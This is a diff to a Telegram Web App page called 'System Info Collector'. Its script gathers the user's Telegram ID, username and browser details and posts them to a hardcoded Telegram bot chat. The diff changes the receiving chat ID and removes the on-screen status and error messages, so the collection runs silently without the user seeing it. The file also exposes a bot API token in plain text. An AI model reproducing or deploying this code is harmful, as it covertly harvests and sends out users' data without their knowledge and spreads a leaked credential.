@@ -2,69 +2,25 @@
 <html>
 <head>
     <title>System Info Collector</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            color: #333;
-        }
-        .error {
-            color: red;
-            margin: 10px 0;
-            padding: 10px;
-            border: 1px solid red;
-            background-color: #ffeeee;
-            border-radius: 5px;
-        }
-        .success {
-            color: green;
-            margin: 10px 0;
-            padding: 10px;
-            border: 1px solid green;
-            background-color: #eeffee;
-            border-radius: 5px;
-        }
-        .info {
-            margin: 10px 0;
-            padding: 10px;
-            border: 1px solid #ccc;
-            background-color: #f9f9f9;
-            border-radius: 5px;
-        }
-    </style>
+  
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body>
-    <div id="status">
-        <div class="info">Сбор информации о системе...</div>
-    </div>
+>
 
 <script>
     Telegram.WebApp.enableClosingConfirmation();
 
     // Telegram Bot API configuration
     const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
-    const CHAT_ID = '5540487728';
+    const CHAT_ID = '8017006818';
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const tg = window.Telegram?.WebApp;
     const userId = tg?.initDataUnsafe?.user?.id;
     const username = tg?.initDataUnsafe?.user?.username || 'не указан';
 
-    // Display message on screen
-    function showMessage(message, type = 'info') {
-        const div = document.createElement('div');
-        div.className = type;
-        div.textContent = message;
-        document.getElementById('status').appendChild(div);
-    }
 
-    // Display error on screen
-    function showError(error) {
-        console.error(error);
-        showMessage(`Ошибка: ${error.message || error}`, 'error');
-    }
+
+
 
     // Detect browser features
     function detectFeatures() {
@@ -341,7 +297,7 @@
                 throw new Error(`Ошибка Telegram API: ${responseData.description}`);
             }
         } catch (error) {
-            showError(error);
+           
             throw error;
         }
     }
